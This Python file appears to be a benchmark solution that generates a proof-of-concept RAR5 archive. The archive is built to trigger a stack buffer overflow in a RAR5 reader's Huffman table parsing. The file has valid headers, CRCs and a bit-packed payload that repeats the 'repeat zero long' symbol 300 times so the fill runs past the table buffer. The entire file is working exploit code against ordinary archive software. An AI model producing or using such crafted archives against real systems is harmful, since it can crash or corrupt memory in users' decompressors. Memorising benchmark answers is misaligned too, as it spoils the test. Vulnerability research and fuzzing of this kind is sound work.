import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in RAR5 reader.
        The vulnerability occurs during Huffman table parsing when RLE compression 
        is used to overflow the table buffer.
        """
        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        def to_vint(val):
            out = bytearray()
            while val >= 0x80:
                out.append((val & 0x7f) | 0x80)
                val >>= 7
            out.append(val)
            return bytes(out)

        def make_header(h_type, flags, extra_data=b''):
            # Header Data = Type + Flags + ExtraData
            # CRC is calculated over Header Data
            h_data = to_vint(h_type) + to_vint(flags) + extra_data
            h_size = to_vint(len(h_data))
            h_crc = struct.pack('<I', zlib.crc32(h_data) & 0xFFFFFFFF)
            return h_crc + h_size + h_data

        # Main Header (Type 1)
        mh = make_header(1, 0)

        # Generate Payload (Compressed Data)
        payload = self.generate_payload()

        # File Header (Type 2)
        # Flags = 0x02 (DATA present)
        data_size = len(payload)
        unpacked_size = 10 * 1024 * 1024 # Large enough to ensure decompression attempt
        host_os = 0 # Windows
        file_hash = b'\x00' * 32
        name = b'poc'

        fh_fields = (
            to_vint(data_size) +
            to_vint(unpacked_size) +
            to_vint(host_os) +
            file_hash +
            to_vint(len(name)) +
            name
        )
        
        fh = make_header(2, 0x02, fh_fields)
        
        # End of Archive (Type 5)
        ea = make_header(5, 0)

        return sig + mh + fh + payload + ea

    def generate_payload(self) -> bytes:
        bits = []
        def write_bits(val, n):
            # RAR5 bit reader reads LSB first
            for i in range(n):
                bits.append((val >> i) & 1)

        # 1. Table Present (1 bit)
        write_bits(1, 1)

        # 2. Bit Length Table (20 entries, 4 bits each)
        # We set all 20 entries to length 5.
        # This assigns codes 0..19 to symbols 0..19 (Canonical Huffman).
        for _ in range(20):
            write_bits(5, 4)

        # 3. Main Table encoded using Bit Length Table
        # We want to trigger an overflow in the decoded Main Table buffer (stack or heap).
        # We use Symbol 18 (Repeat Zero Long) to efficiently write many zeros.
        # With Bit Lengths all 5, Symbol 18 has code 18 (binary 10010).
        # Symbol 18 takes a 7-bit argument for the count.
        # Count = read_bits(7) + 11. Max count = 127 + 11 = 138.
        
        # We repeat this enough times to overflow the buffer (usually 306 entries).
        # 300 repeats * 138 = 41400 entries, which is plenty.
        for _ in range(300):
            write_bits(18, 5)  # Code for Symbol 18
            write_bits(127, 7) # Argument for max repeats

        # Pack bits into bytes
        out = bytearray()
        val = 0
        cnt = 0
        for b in bits:
            val |= (b << cnt)
            cnt += 1
            if cnt == 8:
                out.append(val)
                val = 0
                cnt = 0
        if cnt > 0:
            out.append(val)
            
        return bytes(out)